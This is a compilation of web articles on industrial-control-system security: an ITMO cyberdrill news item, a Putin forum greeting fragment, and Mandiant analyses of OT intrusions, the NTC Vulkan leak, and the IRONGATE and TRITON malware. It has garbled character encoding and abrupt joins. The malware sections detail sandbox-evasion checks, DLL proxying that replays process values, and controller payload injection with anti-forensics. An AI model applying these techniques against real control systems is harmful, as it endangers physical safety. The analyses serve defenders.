                            The team from ITMO’s Faculty of Secure Information Technologies repelled all attacks during international cyberdrills that took place at St. Petersburg Economic Forum (SPIEF). Their task was to respond to a cyberattack on the city’s power grid and prevent a blackout. Students and cybersecurity specialists from Russia, Kazakhstan, Belarus, Azerbaijan, Syria, Pakistan, and Vietnam took part.                          ITMOâs Faculty of Secure Information Technologies team at SPIEF. Credit: t.me/fbit_live The competition was organized by the National Cyber Training Ground Rostelecom Solar. The participants had to prevent an attack on a major electric substation that could lead to a city-wide blackout. The competition consisted of three stages: first, the teams had to detect malware that threatened the power company’s critical systems. The participants had to fully reconstruct the timeline of the attackers’ actions from the moment they hacked into the network to the actual attack. At the second stage, the teams prepared a report on what exactly the attacker did, which signs indicate the presence of malicious code, as well as what measures should be taken to eliminate the consequences of the cyberattack and prevent its recurrence. Finally, in the third stage, the cybersecurity specialists implemented these measures and observed how sufficient they were in real time. A so-called digital twin that imitates the real infrastructure of a power supply company was used for the competition. The attacks were reenacted realistically, too, and included all actions a malefactor typically performs. Among those who managed to completely solve the task were students from ITMO’s Faculty of Secure Information Technologies. For Jean Daniel Kouam Waguia, Van Chuyen Nguyen, and Rand Deeb, this was the first time participating in such a competition, but nevertheless, they performed just as well as professionals from major international security companies (such as Kazakhstan’s Center for Analysis and Investigation of Cyberattacks and the Belarusian National Computer Emergency Response Team). ITMO’s team was headed by PhD students Artem Pavlov and Georgy Gennadyev, multiple-time winners of CTF-format cybersecurity competitions, as well as other national and international contests. Their team ITMO))) recently became a winner at the competition for students of the Northwestern Federal District and will take part in national cyber drills this autumn. Another team member, Rand Deeb, also takes part in cybersecurity competitions on a regular basis – last year, he took the first place in Syria National Cybersecurity CTF. According to Artem Pavlov, the tasks were quite difficult, but solving them helped students understand how to work with large infrastructures: “As a rule, companies have a large infrastructure in which a lot of events are happening at the same time. The SIEM systems we work with contain data on all of them. If you don’t know how the attacks take place, it’s quite difficult to detect and select a few dozen events relevant to the attack out of the two hundred thousand of them. It’s a difficult task, but we did a good job as a team and were able to both restore the attack sequence and take appropriate measures. We were lucky that our team included both experienced specialists and deeply engaged and active students. For them, it was a very useful experience of working with advanced security systems, which otherwise they couldn’t have encountered during their studies,” says Artem Pavlov, a PhD  student at ITMO’s Faculty of Secure Information Technologies.

They will examine the profound tectonic shifts that are gaining momentum today.  These are in no small measure due to the ongoing formation of a multipolar world and efforts by most countries to secure political and economic independence. Given this, I consider it to be both vital and timely that the theme for this yearâs Forum is Sovereign Development as the Basis of a Just World: Joining Forces for Future Generations.  I should note that the Russian business community continues to be active in todayâs economic reality. I would therefore like to once again express my gratitude to all those working at companies and organizations, whether in senior positions or as team members, for  having done much to overcome the severe consequences of unlawful sanctions.  According to experts, the global economy will continue to decelerate in 2023. In contrast, Russiaâs GDP could grow by 1â2%. At the same time, it is vital to make the most of the opportunities that are presenting themselves. That means focusing on attaining technological and financial sovereignty, forging strong ties, developing optimal logistics routes, improving infrastructure and tackling inequality and poverty.  Boosting the labour market is another priority. In order to achieve this, there needs to be a close partnership between the state and the business community, particularly with regard to introducing lean manufacturing technology and modernizing enterprises. And of course, more work is needed to optimize professional training and retraining programmes and improve the national employment service. I firmly believe that the Forum will continue to help attain global economic objectives and serve as an example of constructive dialogue that leads to results. I wish you a rewarding and successful event. Vladimir Putin"

Learn morearrow_forward Start for Free   This post explains the Mandiant philosophy and broader approach to operational technology (OT) security. In summary, we find that combined visibility into both the IT and OT environments is critical for detecting malicious activity at any stage of an OT intrusion. The Mandiant approach to OT security is to:Â  Detect threats early using full situational awareness of IT and OT networks. The surface area for most intrusions transcends architectural layers because at almost every level along the way, there are computers (servers and workstations) and networks using the same or similar operating systems and protocols as used in IT that serve as an avenue of approach for impacting physical assets or control of a physical process. The oft-touted airgap is in many cases a myth.Â  There is often a singular focus from the security community on industrial control system (ICS) malware largely due to its novel nature and the fact that there have been very few examples found. This attention is useful for a variety of reasons, but disproportionate to the actual methods of the intrusions where ICS-tailored malware is used.Â Â  In the attacks using Industroyer and TRITON, the attackers moved from the IT network to the OT network through systems that were accessible to both environments. Traditional malware backdoors, Mimikatz extracts, remote desktop sessions, and other well-documented, easily detected attack methods were used throughout these intrusions and found at every level of the IT, IT demilitarized zone (DMZ), OT DMZ, and OT environments.Â Â  We believe that defenders and incident responders should focus much more attention on intrusion methods, or tactics, techniques, and procedures (TTPs) across the attack lifecycle, most of which are present on what we call ""intermediary systems""âpredominately networked workstations and servers using operating systems and protocols that are similar to (or the same as) those used in IT. This approach is effective because almost all sophisticated OT attacks leverage these systems as stepping-stones to their ultimate target.Â  To illustrate this philosophy, we present some concepts for approaching OT threats, including the Funnel of Opportunity for OT Threat Detection and the Theory of 99, as well as practical examples derived from our analysis and incident response work. We hope these ideas continue to be adopted by others in the security community and help drive discussion and collaboration. We strive for a world where attacking or disrupting ICS operations costs the threat actor their cover, their toolkits, their time, and their freedom.Â  During decades of responding to and analyzing many of the most important threats in IT and OT, Mandiant has observed a consistent pattern across almost all OT security incidents: There is an inverse relationship between the presence of an attacker's activities and the severity of consequence to physical assets or processes. The attack lifecycle when viewed like this begins to take on a ""funnel"" shape, representing both the breadth of attacker footprint and the breadth of detection opportunity for any given level. Similarly, from top to bottom we represent the timeline of the intrusion and its proximity to the physical world. The bottom is the crossover of impact from the cyber world to the physical world.Â  Â  In the early stages of the attack lifecycle, the intruder spends prolonged time periods targeting components such as servers and workstations across IT and the IT DMZ. Identifying threat activity at this architectural level is relatively straightforward given that dwell time is high, threat actors often leave visible traces, and there are many mature security tools, services, and other capabilities designed to detect this activity. While it is difficult to anticipate or associate this early intrusion activity in IT layers with more complex OT-targeted attacks, IT networks remain the best zone to detect attacks. In addition to being relatively easy to detect, early attacker activity also presents a very low risk of negative impact to OT networks. This is primarily because OT networks are commonly segmented, often with an OT DMZ separating them from IT, limiting attacker access to the industrial process. Also, targeted OT attacks commonly require threat actors to acquire abundant process documentation to determine how to cause a desired outcome. While some of this information may be available in IT networks, planning this attack type would almost certainly require further process visibility, which is only available in the OT network. This is why, as the intrusion progresses and the attacker gets closer or gains access to OT networks, the severity of possible negative outcomes becomes proportionally higher. However, the activity becomes more difficult to detect as the attacker's footprint grows smaller and there are fewer security tools available to defenders. Figure 2 shows an approximate representation of endpoints that were compromised across the architecture of victim organizations during the TRITON and Industroyer attacks. The Funnel of Opportunity is located in the intersection between the two triangles. It is here that the balance between attacker presence and operational consequence of an intrusion makes it easier and more meaningful for security organizations to identify threat activity. As a result, threat hunting close to the OT DMZ and the Distributed Control System (DCS) represents the most efficient approach as the intrusion's detectable features are still present and the severity of potential consequences of the intrusion is high, but still not critical. In both the TRITON and Industroyer incidents, the threat actor followed a consistent pattern traversing the victims' architecture from IT networks, through the OT network, and ultimately reaching the physical process controls. In both incidents, we observed that the actor moved through segmented architectures using computers located in different zones. While we only illustrated two incidents in this blog, we highlight that movement across zones leveraging computers has also been observed in every public OT security incident to date.  Mandiant has unique visibility into the full attack lifecycle of thousands of intrusions from both independent research and first-hand incident response experience that has enabled us to support this theory with real-world data, some of which we share here. Mandiant has consistently identified similar TTPs leveraged by threat actors regardless of their target industry or ultimate goals. We believe that visibility into network traffic and endpoint behaviors are some of the most important components for IT security. These components are also critical in preventing pivots to key assets in the OT network and detecting threat activity once it does reach OT. Our observations can be summarized in what we call the Theory of 99, which states that in intrusions that go deep enough to impact OT: As a result, there is often a significant overlap across TTPs utilized by threat actors targeting both IT and OT networks. Figure 3 presents a summary of TTP overlaps between TRITON, Industroyer, and some relatively common activity from cyber crime groups FIN6 and FIN11. FIN6 is a group of intrusion operators who have compromised multiple point-of-sale (POS) environments to steal payment card data and sell it in on the dark web. FIN11 has conducted widespread phishing campaigns since at least 2016 targeting a variety of organizations across a diverse set of sectors and geographic regions. While the motivations and ultimate goal of the threat actors that developed TRITON and Industroyer differ significantly from FIN6 and FIN11, the four actors share common TTPs, including the use of Meterpreter, leveraging RDP to establish remote connections, and so forth. The overlap in tools and TTPs across actors interested in IT and OT should be of no surprise. The use of IT tools for OT compromises directly corresponds to a trend best known as IT/OT convergence. As IT equipment increasingly becomes integrated in OT systems and networks to improve efficiency and manageability, we can expect threat actors to be able to leverage networked computers as a conduit to reach industrial controls. Drawing parallels between intrusions into high-security environments, we can gain insight into actor behaviors and identify detection opportunities earlier in the attack lifecycle. Intelligence on intrusions across various sectors can be useful in highlighting which common and emerging adversary tools and TTPs are likely to be used in tailored attacks against organizations with OT assets. While the Mandiant approach to OT security detailed in this blog emphasizes the criticality of ""intermediary systems"" when defending OT, we do not want to downplay the importance of the OT expertise and technology needed to respond to the most critical one percent of threat activity that does impact control systems. OT is in our DNA at Mandiant. The Mandiant OT practice has been one of the leading industry voices during the past six years, and Mandiantâs cyber physical intelligence team was founded as Critical Intelligenceâthe first commercial OT threat intelligence company founded in 2009. We believe that sharing our philosophy for OT security and highlighting Mandiant's comprehensive OT security capabilities will help organizations look at this security challenge from a different angle and take tangible steps forward to build a robust, all-encompassing security program.

Learn morearrow_forward Start for Free   As a part of Mandiantâs research on Russian cyber and information operations (IO) capabilities, Mandiant worked with a collective of media outlets, includingÂ Papertrail Media, Der Spiegel, Le Monde, and Washington Post, to analyze several documents belonging to a Russian IT contractor named NTC Vulkan (Russian: ÐÐ¢Ð¦ ÐÑÐ»ÐºÐ°Ð½). The documents detail project requirements contracted with the Russian Ministry of Defense, including in at least one instance for GRU Unit 74455, also known as Sandworm Team. These projects include tools, training programs, and a red team platform for exercising various types of offensive cyber operations, including cyber espionage, IO, and operational technology (OT) attacks. The documents, which are dated between 2016 and 2020, offer a brief snapshot of previous Russian investments and considerations in scaling cyber operations and capability development. However, Mandiant lacks evidence to prove that the capabilities we discuss have been implemented or are feasible.Â  A note on source authenticity: Mandiant cannot conclusively confirm the authenticity of these documents based on limitations in our current visibility. However, we strongly suspect they are legitimate based on consistencies observed across the documents we reviewed, limited instances where we were able to validate details externally, and an apparent alignment between the capabilities detailed for development in these programs and those that we have previously observed used at high levels by Russian intelligence services. NTC Vulkan is a Russian IT contractor based in Moscow, which publicly advertises working on contracts with large companies and government agencies within Russia. The companyâs website cites compliance with Russian government standards but does not publicly state working with Russian state contractors, such as research institutes or Russian intelligence services. Based on our analysis of the leaked documentation, NTC Vulkan has held contracts with Russian intelligence services on projects to enable cyber and IO operations, potentially in tandem with cyber operations against OT targets. The documents detail three projects: Scan, Amesit, and Krystal-2B.Â  Tool Description Contract Dates Scan A comprehensive framework likely used to enable cyber operations. Scan consists of a variety of methods for large-scale data collection and contains comprehensive documentation on how to structure databases to store and handle such information. Based on the signatories, Scan documentation was contracted (at least in part) by GRU Unit 7445, or Sandworm Team. ~2018-2019 Amesit (Alt: Amezit) A framework used to control the online information environment and manipulate public opinion, enhance psychological operations, and store and organize data for upstream communication of efforts. Information confrontation and psychological operations in Amesit are designed to support IO and OT-related operations.Â  2016-2018 Krystal-2B A training platform for exercising coordinated IO/OT attacks against transportation and utility industries using Amesit. The exerciseâs program highlights particular scenarios against OT environments and Russian infrastructure. Krystal-2B may be a red teaming or defensively focused exercise, but demonstrates interest in coordinating IO/OT attacks.Â  2018-2020 The cyber operation tools and capabilities detailed in the leaked NTC Vulkan documents are presented as separate and distinct projects. Mandiant did not identify any evidence indicating how or when the tools could be used. However, based on our analysis of the capabilities, we consider it feasible that the projects represent only some pieces of a variety of capabilities pursued by Russian-sponsored actors to conduct different types of cyber operations. Scan appears to be a comprehensive framework used to gather different types of information such as network details, configurations, and vulnerabilities, among other types of data, toÂ enable cyber operations. Amesit and Krystal-2B focus on developing capability to control the information environment, in part by simulating IT/OT attacks. The documents included pictures of a prototype platform that would enable operators to interact with different cyber operation tools. This combination of capabilities is in line with what Russian intelligence services deem a key part of their information confrontation strategy. Capabilities documented in the contracted NTC Vulkan project Scan could help automate parts of the reconnaissance and preparation of operations. Scan is a framework comprising multiple components including a large-scale database, methods to gather data from various sources, and a platform to process and action such data collections. The documentation about Scan is incredibly comprehensive, detailing data transfer between components, open-source and foreign-made software and hardware. Additionally, the capabilities described for this toolâs design take into consideration the need for coordination across groups and operators in different locations. Comprehensive capability gathering and processing dataâsuch as the one described in Scanâcould enable the operators to systematize and automate cyber operations to conduct activity across a range of domains from cyber espionage to OT targeted attacks. Capabilities outlined in NTC Vulkan Amesit documentation could support a full information operations life cycle: monitoring the media landscape, creating content to promote a specific narrative, establishing and leveraging means to disseminate that content, and assessing the effectiveness of an operation (Figure 3). The use-case detailed in the documents suggests a systematic approach to IO wherein operators can leverage a suite of options to tailor and adapt their operations. The requirements also discuss how to reduce the risk of identification and potential attribution. This includes the ability to clean and replace metadata attached to the files of content created for dissemination, and means of creating inauthentic profiles on social media and forums for content promotion. Functions detailed in the requirements also account for the ability to localize the targeting of an operation within a given geographic area. While it is unclear what targets the tools would be used upon, some of the social media platforms and information resources listed as targets for data collection and content dissemination include those more specific to Russia and the surrounding region. It also includes those with broader global usership, suggesting that Amnesit tooling could be used both for regional or broader targeting. The documents from NTC Vulkan also include contents related to OT systems in two projects: Krystal-2B and Amesit. Krystal-2B is a training platform that simulates OT attacks against different types of OT environments in coordination with some IO components by leveraging Amesit âfor the purpose of disruption.â The Krystal-2B documentation highlights scenarios against Russian military infrastructure, rail systems, airports, sea ports, and energy and water utilities, but does not detail specific methodologies on the malicious activities executed within these exercises. Krystal-2B appears designed to support both offensive exercises against OT environments (Figure 4) and defensive exercises to examine vulnerabilities in Russian military infrastructure. The Krystal-2B project relies on tooling from another project named Amesit. The OT portion of the project is referenced in a set of testing requirements for Amesit, which describes the implementation of simulated OT test bed environments for rail and pipeline control systems. The Amesit documentation indicates these models would be supported by either graphical or physical models of these systems to visualize the effects of cyber attacks, clearly establishing these industries as Russiaâs targets of interest for OT-oriented attacks.Â  The only attack-related requirement for the OT test beds is that they provide âsimulation of ARP-spoofing attacks, leading to violations of simulated technological processes.â These violations include either common IT-oriented impacts on the network infrastructure or complex changes in the parameters of the OT via âspecialized software.â It is unclear whether such software refers to Amesit tooling, legitimate programmable logic controller (PLC) engineering software, or some other existing capabilities. While we have not linked this activity to existing toolsets, frameworks like INCONTROLLER are designed to support these types of parameter changes. The document also specifies specific parameters of the control systems that the attacker should be able to affect and physical impacts the attacker should be able to generate. These specifications provide potential insight into the process-level design of these attack scenarios.Â  Although there is little information in both documents on how the attacks would occur in a real setting, the capabilities we observed are consistent to those Mandiant has observed in previous attacks and tooling from Russian-sponsored actors. Another noteworthy observation is the incorporation of IO capabilities in the same projects that describe OT targeting, which hints at the likelihood of deploying campaigns that leverage both resources to support complex information warfare operations. The contracted projects from NTC Vulkan provide insight into the investment of Russian intelligence services into developing capabilities to deploy more efficient operations within the beginning of the attack lifecycle, a piece of operations often hidden from our view. A framework like the one suggested in the Scan project illustrates how the GRU may be trying to enable fast-paced operations with high coordination among regional units. A once-segmented GRU cyber operation may become streamlined and more efficient using a framework like Scan. These projects also show interest in holistic operations to conduct information control and/or confrontation and amplify the psychological effects of cyber operations. For example, Amesit and Krystal-2B demonstrate a high value placed on the psychological impact of offensive cyber attacks, specifically OT operations, by highlighting the roleÂ  of information operations in determining the impact of an ICS incident. The combination of different tactics in cyber operations is familiar to Russian cyber operations: an early example is the multifaceted BLACKENERGY operation in 2015 leading to disruption of energy infrastructure in Ukraine. We have also seen the combination of IO and disruptive cyberattacks throughout the Ukraine war. The documentation from Krystal-2B and Amesit also displays interest in critical infrastructure targets, particularly energy utilities and oil and gas, but also water utilities and transportation systems, including rail, sea, and air. As we continue to observe the intensification of threat activity from Russian-sponsored actors in parallel to the invasion in Ukraine, defenders should remain aware about the capabilities and priorities reflected in these documents to be prepared for protecting critical infrastructure and services.

Learn morearrow_forward Start for Free   In the latter half of 2015, the FLARE team identified several versions of an ICS-focused malware crafted to manipulate a specific industrial process running within a simulated Siemens control system environment. We named this family of malware IRONGATE. FLARE found the samples on VirusTotal while researching droppers compiled with PyInstaller â an approach used by numerous malicious actors. The IRONGATE samples stood out based on their references to SCADA and associated functionality. Two samples of the malware payload were uploaded by different sources in 2014, but none of the antivirus vendors featured on VirusTotal flagged them as malicious. Siemens Product Computer Emergency Readiness Team (ProductCERT) confirmed that IRONGATE is not viable against operational Siemens control systems and determined that IRONGATE does not exploit any vulnerabilities in Siemens products. We are unable to associate IRONGATE with any campaigns or threat actors. We acknowledge that IRONGATE could be a test case, proof of concept, or research activity for ICS attack techniques. Our analysis finds that IRONGATE invokes ICS attack concepts first seen inÂ Stuxnet, but in a simulation environment. Because the body ofÂ industrial control systems (ICS)Â and supervisory control and data acquisition (SCADA) malware is limited, we are sharing details with the broader community. IRONGATE's key feature is a man-in-the-middle (MitM) attack against process input-output (IO) and process operator software within industrial process simulation. The malware replaces a Dynamic Link Library (DLL) with a malicious DLL, which then acts as a broker between a PLC and the legitimate monitoring software. This malicious DLL records five seconds of 'normal' traffic from a PLC to the user interface and replays it, while sending different data back to the PLC. This could allow an attacker to alter a controlled process unbeknownst to process operators. IRONGATE's second notable feature involves sandbox evasion. Some droppers for the IRONGATE malware would not run if VMware or Cuckoo Sandbox environments were employed. The malware uses these techniques to avoid detection and resist analysis, and developing these anti-sandbox techniques indicates that the author wanted the code to resist casual analysis attempts. It also implies that IRONGATEâs purpose was malicious, as opposed to a tool written for other legitimate purposes. We first identified IRONGATE when investigating droppers compiled with PyInstaller â an approach used by numerous malicious actors. In addition, strings found in the dropper include the word âpayloadâ, which is commonly associated with malware. While IRONGATE malware does not compare to Stuxnet in terms of complexity, ability to propagate, or geopolitical implications, IRONGATE leverages some of the same features and techniques Stuxtnet used to attack centrifuge rotor speeds at the Natanz uranium enrichment facility; it also demonstrates new features for ICS malware. IRONGATEâs characteristics lead us to conclude that it is a test, proof of concept, or research activity. Even though process operators face no increased risk from the currently identified members of the IRONGATE malware family, IRONGATE provides valuable insight into adversary mindset. Network security monitoring, indicator of compromise (IoC) matching, and good practice guidance from vendors and other stakeholders represent important defensive techniques for ICS networks. To specifically counter IRONGATEâs process attack techniques, ICS asset owners may, over the longer term, implement solutions that: We identified six IRONGATE droppers:Â bla.exe, update.exe1, update_no_pipe.exe1,Â update_no_pipe.exe2, update_no_pipe.exe2,Â update.exe3.Â All but one of these Python-based droppers first checks for execution in a VMware or Cuckoo Sandbox environment. If found, the malware exits. If not found, the IRONGATE dropper extracts a UPX-packed, publicly available utility (NirSoft NetResView version 1.27) toÂ audiodg.exeÂ in the same directory as the dropper. The dropper then executes the utility using the commandÂ audiodg.exe /scomma scxrt2.ini.Â This command populates the fileÂ scxrt2.iniÂ with a comma-separated list of network resources identified by the host system. The dropper iterates through each entry inÂ scxrt2.ini, looking for paths namedÂ move-to-operationalÂ orÂ move-to-operational.lnk. If a path is found, the dropper first extracts the Base64-encoded .NET executableÂ scada.exeÂ to the current directory and then moves the file to the path containingÂ move-to-operationalÂ orÂ move-to-operational.lnk.Â The pathÂ move-to-operationalÂ is interesting as well, perhaps implying that IRONGATE was not seeking the actual running process, but rather a staging area for code promotion. The dropper does not execute theÂ scada.exeÂ payload after moving it. Each IRONGATE dropper currently identified deploys the same .NET payload,Â scada.exe.Â All but one of the droppers incorporated anti-detection/analysis techniques to identify execution in VMware or the Cuckoo Sandbox. If such environments are detected, the dropper will not deploy the .NET executable (scada.exe) to the host. Four of the droppers (update.exe1, update_no_pipe.exe1, update_no_pipe.exe2,Â andÂ update.exe3) detect Cuckoo environments by scanning subdirectories of theÂ %SystemDrive%. Directories with names greater than five, but fewer than ten characters are inspected for the subdirectoriesÂ drop, files, logs, memory,Â andÂ shots.Â If a matching directory is found, the dropper does not attempt to deploy theÂ scada.exeÂ payload. TheÂ update.exe1Â andÂ update.exe3Â droppers contain code for an additional Cuckoo check using the SysInternals pipelist program,Â install.exe, but the code is disabled in each. TheÂ update.exe2Â dropper includes a check for VMware instead of Cuckoo. The VMWare check looks for the registry keyÂ HKLM\SOFTWARE\VMware, Inc.\VMware ToolsÂ and the filesÂ %WINDIR%\system32\drivers\vmmouse.sysÂ andÂ %WINDIR%\system32\drivers\vmhgfs.sys. If any of these are found, the dropper does not attempt to deploy theÂ scada.exeÂ payload. The dropperÂ bla.exeÂ does not include an environment check for either Cuckoo or VMware. We surmise thatÂ scada.exeÂ is a user-created payload used for testing the malware. First, our analysis did not indicate what triggersÂ scada.exeÂ to run. Second, Siemens ProductCERT informed us thatÂ scada.exeÂ is not a default file name associated with Siemens industrial control software. WhenÂ scada.exeÂ executes, it scans drives attached to the system for filenames ending inÂ Step7ProSim.dll. According to the Siemens ProductCERT,Â Step7ProSim.dllÂ is not part of the Siemens PLCSIM software. We were unable to determine whether this DLL was created specifically by the malware author, or if it was from another source, such as example code or a particular custom ICS implementation. We surmise this DLL simulates generation of IO values, which would normally be provided by an S7-based controller, since the functions it includes appear derived from the Siemens PLCSIM environment. IfÂ scada.exeÂ finds a matching DLL file name, it kills all running processes with the nameÂ biogas.exe. The malware then movesÂ Step7ProSim.dllÂ toÂ Step7ConMgr.dllÂ and drops a maliciousÂ Step7ProSim.dllÂ â the IRONGATE payload â to the same directory. The maliciousÂ Step7ProSim.dllÂ acts as an API proxy between the original user-createdÂ Step7ProSim.dllÂ (now namedÂ Step7ConMgr.dll) and the applicationÂ biogas.exeÂ that loads it. Five seconds after loading, the maliciousÂ Step7ProSim.dllÂ records five seconds of calls toÂ ReadDataBlockValue. All future calls toÂ ReadDataBlockValueÂ return the recorded data. Simultaneously, the malicious DLL discards all calls toÂ WriteDataBlockValueÂ and instead callsÂ WriteInputPoint(0x110, 0, 0x7763)Â andÂ WriteInputPoint(0x114, 0, 0x7763)Â every millisecond. All of these functions are named similarly to Siemens S7ProSim v5.4 COM interface. It appears that other calls to API functions are passed through the malicious DLL to the legitimate DLL with no other modification. As mentioned previously, IRONGATE seeks to manipulate code similar to that found on a blog dealing with simulating PLC communications using PLCSIM, including the use of an executable namedÂ biogas.exe. Examination of the executable from that blogâs demo code shows that theÂ WriteInputPointÂ function calls with byte indicesÂ 0x110Â andÂ 0x114Â set pressure and temperature values, respectively: IRONGATE: Â Â Â Â Â Â Â Â Â WriteInputPoint(0x110, 0, 0x7763)WriteInputPoint(0x114, 0, 0x7763) Â Equivalent pseudo code from Biogas.exe:Â  Â  Â  Â  Â  S7ProSim.WriteInputPoint(0x110, 0, (short)this.Pressure.Value)Â  Â Â  S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value) We have been unable to determine the significance of the hardcoded valueÂ 0x7763, which is passed in both instances of the write function. Because of the noted indications that IRONGATE is a proof of concept, we cannot conclude IRONGATEâs author intends to manipulate specific temperature or pressure values associated with the specific biogas.exe process, but find the similarities to this example code striking. The IRONGATE droppers are Python scripts converted to executables using PyInstaller. The compiled droppers contain PyInstaller artifacts from the system the executables were created on. These artifacts may link other samples compiled on the same system. Five of the six file droppers (bla.exe, update.exe1, update_no_pipe.exe1, update_no_pipe.exe2Â and update.exe3) all share the same PyInstaller artifacts listed in Table 1. The remaining dropper,Â update.exe2, contains the artifacts listed in Table 2. Figure 1 and 2 list the unique strings discovered in theÂ scada.exeÂ andÂ Step7ProSim.dll binaries. Table 3 contains the MD5 hashes, file and architecture type, and compile times for the malware analyzed in this report. A list of indicators can be foundÂ here.

The targeted systems provided emergency shutdown capability for industrial processes. We assess with moderate confidence that the attacker was developing the capability to cause physical damage and inadvertently shutdown operations. This malware, which we call TRITON, is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers. We have not attributed the incident to a threat actor, though we believe the activity is consistent with a nation state preparing for an attack. TRITON is one of a limited number of publicly identified malicious software families targeted at industrial control systems (ICS). It follows Stuxnet which was used against Iran in 2010 and Industroyer which we believe was deployed by Sandworm Team against Ukraine in 2016. TRITON is consistent with these attacks, in that it could prevent safety mechanisms from executing their intended function, resulting in a physical consequence. Malware Family Main Modules Description TRITON trilog.exe Main executable leveraging libraries.zip library.zip Custom communication library for interaction with Triconex controllers. Table 1: Description of TRITON Malware The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message. We assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons: FireEye has not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attackerâs persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor. Â Specifically, the following facts support this assessment: The attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups. The attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol. The targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency. Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as Industrial Control Systems (ICS) or Operational Technology (OT). A Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment. A SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations. Asset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts. The attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attackerâs mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it. Figure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls. The SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS. Attack Option 1: Use the SIS to shutdown the process Attack Option 2: Reprogram the SIS to allow an unsafe state Attack Option 3: Reprogram the SIS to allow an unsafe state â while using the DCS to create an unsafe state or hazard We assess with moderate confidence that the attackerâs long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place. Once on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scriptsâ conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown. Of note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption. The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITONâs extensive reconnaissance capabilities). The TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks. Asset owners who wish to defend against the capabilities demonstrated in the incident, should consider the following controls: TRITON was deployed on an SIS engineering workstation running the Microsoft Windows operating system. The malware was named to masquerade as the legitimate Triconex Trilog application. This application is used for reviewing logs and is a part of the TriStation application suite. The malware was delivered as a Py2EXE compiled python script dependent on a zip file containing standard Python libraries, open source libraries, as well as the attacker-developed Triconex attack framework for interacting with the Triconex controllers. Along with the executable, two binary files, inject.bin (malicious function code) and imain.bin (malicious control logic), were deployed as the controllerâs payload. These file names were hard coded in the Py2EXE compiled python script. Trilog.exe took one option from the command line, which was a single IP address of the target Triconex device. It did not leverage the underlying TRITON libraryâs capability for Triconex device discovery, instead an instance of trilog.exe had to be invoked separately for each target controller in the environment. Once invoked, trilog.exe checked the status of the controller, then read the configuration information exposed by the TriStation protocol. If the controller was in a running state, trilog.exe encoded the two payload files inject.bin and imain.bin and passed them to the communication libraries to be appended to the controllerâs program memory and execution table. After payload files were inserted into memory on the Triconex controller, the script initiated a countdown, periodically checking the status of the controller. If an error was detected, the communication libraryâs method SafeAppendProgramMod attempted to reset the controller to the previous state using a TriStation protocol command. If this failed, trilog.exe attempted to write a small âdummyâ program to memory. We assess that this was an anti-forensics technique to hide the presence of the attacker code on the Triconex controller. Working with the asset owner, Mandiant ran trilog.exe in a lab environment with a valid Triconex controller and discovered a conditional check in the malware that prevented the payload 